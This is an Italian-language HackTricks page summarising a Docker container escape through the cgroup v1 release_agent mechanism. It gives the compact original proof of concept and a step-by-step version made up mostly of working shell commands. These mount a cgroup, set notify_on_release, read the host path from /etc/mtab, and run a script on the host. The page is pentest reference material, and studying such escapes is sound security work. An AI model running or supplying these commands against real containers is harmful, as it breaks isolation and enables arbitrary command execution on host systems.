# Docker release_agent cgroups escape

{{#include ../../../../banners/hacktricks-training.md}}

**Per ulteriori dettagli, fare riferimento al** [**post originale del blog**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**.** Questo è solo un riassunto:

Original PoC:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
La prova di concetto (PoC) dimostra un metodo per sfruttare i cgroups creando un file `release_agent` e attivando la sua invocazione per eseguire comandi arbitrari sull'host del container. Ecco una suddivisione dei passaggi coinvolti:

1. **Preparare l'Ambiente:**
- Viene creata una directory `/tmp/cgrp` per fungere da punto di montaggio per il cgroup.
- Il controller cgroup RDMA è montato su questa directory. In caso di assenza del controller RDMA, si suggerisce di utilizzare il controller cgroup `memory` come alternativa.
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **Imposta il Cgroup Figlio:**
- Viene creato un cgroup figlio chiamato "x" all'interno della directory cgroup montata.
- Le notifiche sono abilitate per il cgroup "x" scrivendo 1 nel suo file notify_on_release.
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **Configura il Release Agent:**
- Il percorso del container sull'host è ottenuto dal file /etc/mtab.
- Il file release_agent del cgroup viene quindi configurato per eseguire uno script chiamato /cmd situato nel percorso host acquisito.
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **Crea e Configura lo Script /cmd:**
- Lo script /cmd viene creato all'interno del container ed è configurato per eseguire ps aux, reindirizzando l'output a un file chiamato /output nel container. Il percorso completo di /output sull'host è specificato.
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **Attivare l'attacco:**
- Un processo viene avviato all'interno del cgroup figlio "x" e viene immediatamente terminato.
- Questo attiva il `release_agent` (lo script /cmd), che esegue ps aux sull'host e scrive l'output in /output all'interno del container.
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
{{#include ../../../../banners/hacktricks-training.md}}
